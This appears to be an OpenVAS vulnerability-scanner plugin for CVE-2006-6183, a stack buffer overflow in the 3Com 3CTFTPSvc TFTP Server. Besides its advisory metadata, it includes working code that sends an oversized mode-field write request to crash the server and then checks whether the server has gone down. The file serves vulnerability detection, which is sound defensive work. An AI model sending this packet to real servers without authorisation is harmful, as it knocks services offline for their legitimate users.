##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_3ctftpsvc_tftp_server_mode_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# 3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause the application to
  crash, denying further service to legitimate users.
  Impact Level: Application";
tag_affected = "3Com 3CTFTPSvc TFTP Server version 2.0.1";
tag_insight = "The flaw is due to a boundary error during the processing of TFTP
  Read/Write request packet types. This can be exploited to cause a stack
  based buffer overflow by sending a specially crafted packet with an overly
  long mode field.";
tag_solution = "No solution or patch is available as of 10th July, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://support.3com.com/software/utilities_for_windows_32_bit.htm";
tag_summary = "This host is running 3CTftpSvc TFTP Server and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(802658);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2006-6183");
  script_bugtraq_id(21301, 21322);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-10 15:15:15 +0530 (Tue, 10 Jul 2012)");
  script_name("3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/23113");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/30545");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2006120002");
  script_xref(name : "URL" , value : "http://support.3com.com/software/utilities_for_windows_32_bit.htm");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded");

  script_description(desc);
  script_summary("Determine if 3CTFTPSvc TFTP Server is prone to a denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("tftp.inc");

## Get TFTP Port
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check TFTP Port Status
if(! tftp_alive(port:port)){
  exit(0);
}

## Open UDP Socket
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Construct the attack request with long transporting mode
mode = "netascii" + crap(data: "A", length: 469);
attack = raw_string(0x00, 0x02) +       ## Write Request
         "A" + raw_string(0x00) +       ## Source File Name
         mode + raw_string(0x00);       ## Type (Mode)

## Send the attack request to TFTP Server
send(socket:soc, data:attack);
send(socket:soc, data:attack);
close(soc);

sleep(2);

## Check TFTP Server is alive or not
if(!tftp_alive(port:port)) {
  security_hole(port:port, proto:"udp");
}
